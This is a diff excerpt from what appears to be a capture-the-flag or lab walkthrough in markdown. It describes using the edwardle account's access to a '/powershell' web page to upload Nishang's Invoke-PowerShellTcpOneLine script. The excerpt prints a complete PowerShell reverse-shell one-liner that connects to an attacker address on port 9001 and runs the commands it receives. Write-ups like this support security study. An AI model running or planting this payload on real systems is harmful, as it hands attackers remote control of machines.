@@ -1615,7 +1615,7 @@ Upon returning to the `/powershell` page using `edwardle`s credentials, I was gr
 
 ![Pasted image 20240811013844](https://github.com/user-attachments/assets/fdc3fc06-16af-429a-9963-1d5d5b5a0bf1)
 
-The [Nishang](https://github.com/samratashok/nishang) script `Invoke-PowerShellTcpOneLine.ps1` was encoded in Base64, and transferred via the web interface to obtain a reverse shell on the system.
+The [Nishang](https://github.com/samratashok/nishang) script `Invoke-PowerShellTcpOneLine.ps1` was transferred via the web interface to obtain a reverse shell on the system.
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient($ip_addr,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
